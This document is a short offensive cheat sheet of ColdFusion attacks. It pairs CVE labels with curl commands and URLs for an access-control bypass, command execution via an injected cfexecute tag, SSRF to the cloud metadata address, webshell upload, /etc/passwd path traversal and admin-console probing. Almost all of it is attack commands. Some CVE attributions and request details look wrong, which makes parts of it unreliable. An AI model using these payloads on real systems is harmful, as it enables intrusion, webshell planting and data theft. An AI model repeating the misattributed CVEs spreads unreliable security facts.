# ColdFusion Attacks

## 1. CVE-2023-29298 — Access Control Bypass
```bash
# ColdFusion 2023/2021
curl -sk "http://target/CFIDE/adminapi/_datasource/index.cfm?wsdl"
# Bypass auth
curl -sk "http://target/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm"
```

## 2. CVE-2023-26360 — RCE
```bash
# Deserialization RCE
curl -sk -X POST "http://target/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm" -d "folderPath=<cfexecute name='id'/>"
```

## 3. CVE-2021-21983/21982 — SSRF/File Read
```bash
# SSRF
curl -sk "http://target/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm?url=http://169.254.169.254"
```

## 4. CVE-2018-15965 — Arbitrary File Upload
```bash
# Upload webshell
curl -sk -X POST "http://target/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/shell.cfm" -F "file=@shell.cfm"
```

## 5. CVE-2017-3066 — AMF Deserialization
```bash
# BlazeDS AMF deserialization
# Use ColdFusion_poc.py
python3 cf_exploit.py -t http://target
```

## 6. CVE-2013-0632 — Arbitrary File Read
```
http://target/CFIDE/administrator/enter.cfm?locale=../../../../../../../etc/passwd%00en
```

## 7. LFI via locale parameter
```
http://target/CFIDE/administrator/enter.cfm?locale=../../../../../../etc/passwd%00
```

## 8. ColdFusion Debug Mode
```
http://target/CFIDE/debug/cfdebug.cfm
http://target/CFIDE/debug/cfsqldebug.cfm
```

## 9. Admin Console
```
http://target/CFIDE/administrator/
http://target/CFIDE/adminapi/
http://target/CFIDE/componentutils/
```

## 10. Scheduled Tasks
```
http://target/CFIDE/administrator/scheduler/scheduletasks.cfm
# Can create tasks that execute commands
```

## Detection
```bash
# Check for ColdFusion
curl -sk "http://target/" -I | grep -i "coldfusion\|cfide"
curl -sk "http://target/CFIDE/administrator/"
# Version
curl -sk "http://target/CFIDE/adminapi/base.cfc?wsdl"
```
